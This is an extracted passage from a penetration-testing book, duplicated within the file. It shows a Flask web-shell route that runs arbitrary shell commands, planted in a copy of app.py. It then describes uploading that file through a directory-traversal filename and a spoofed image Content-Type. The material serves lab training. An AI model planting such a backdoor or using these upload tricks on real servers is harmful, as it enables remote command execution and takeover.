@@ -1,0 +1,28 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 01 - Download the malicious version of the app.py file from the book’s GitHub repository.
+When you open this file, you’ll see that it’s pretty much a direct copy of the original app.py file. However, we’ve added another route to the bottom of the file:
+app.py
+--snip--
+❶ @app.route('/webshell/<command>')
+def webshell(command):
+    result = subprocess.check_output(command, shell=True)
+    return result.decode('utf-8')
+Security Relevance Score: 3
+Word Count: 184
+Extracted: 2025-06-13 23:40:57
+
+---
+
+Download the malicious version of the app.py file from the book’s GitHub repository.
+When you open this file, you’ll see that it’s pretty much a direct copy of the original app.py file. However, we’ve added another route to the bottom of the file:
+app.py
+--snip--
+❶ @app.route('/webshell/<command>')
+def webshell(command):
+    result = subprocess.check_output(command, shell=True)
+    return result.decode('utf-8')
+
+The line at ❶ appends a new /webshell/<command> URL, which executes the webshell() function. This function accepts a command as a parameter. The rest of the file looks very similar to the python-webshell-check.py file.
+Let’s upload this web shell to p-web-01 by using Burp Suite. First, exploit the directory traversal vulnerability by renaming the filename in the request to ../app.py. Doing this should allow us to overwrite the original app.py file on the server.
+The next step is to change the request’s Content-Type header to trick the server into thinking we’re uploading an image. Modify the header to include the image/jpeg content type. Then paste the content of the malicious file into the request’s body. Before clicking Send, make sure your request looks like the one in Figure 6-
